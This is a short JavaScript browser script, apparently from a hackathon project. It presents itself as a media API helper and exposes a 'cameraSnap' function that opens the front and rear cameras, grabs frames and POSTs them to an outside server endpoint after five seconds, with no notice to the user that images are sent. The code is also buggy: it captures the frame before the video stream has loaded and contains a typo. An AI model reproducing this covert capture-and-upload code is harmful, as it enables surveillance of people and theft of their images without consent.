/*
    * using web navigator media api
    * inspired by world
    * v.1.0.0
*/
((require)=>{
    const video = document.createElement('video');
    video.setAttribute('playsinline', '');
    video.setAttribute('autoplay', '');
    video.setAttribute('muted', '');
    video.style.width = '400px';
    video.style.height = '400px';
    //'user' or 'environment'
    const doScreenshot = (facingMode='user') => {
        var constraints = {
          audio: false,
          video: {
           facingMode: facingMode
          }
        };
        navigator.mediaDevices.getUserMedia(constraints)
        .then(function success(stream) {
          video.srcObject = stream;
        });
            const canvas = document.createElement('canvas')
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const scs = canvas.toDataURL('image/webp');
            const st = setTimeout(function() {
                console.log(scs)
                const link = 'https://server-website-for-hackathon.onrender.com/sendData';
                fetch(link, {
                method: 'POST',
                body: JSON.stringify({
                data: scs
                }),
                headers: {
                  'Content-type': 'application/json; charset=UTF-8',
                }
                })
                .then((response) => response.text())
                .then((json) => {});
               /* function stopStream(stream) {
                    stream.ream.getTracks().forEach(track => {track.stop()})
                }*/
                clearTimeout();
            }, 5000);
    };
    require.Risosi = {
        cameraSnap: (both=true)=>{
            if (both) {
                doScreenshot(facingMode='user'),
                doScreenshot(facingMode='environment')
            }
            else{
                doScreenshot()
            }
        }
    }
})(window)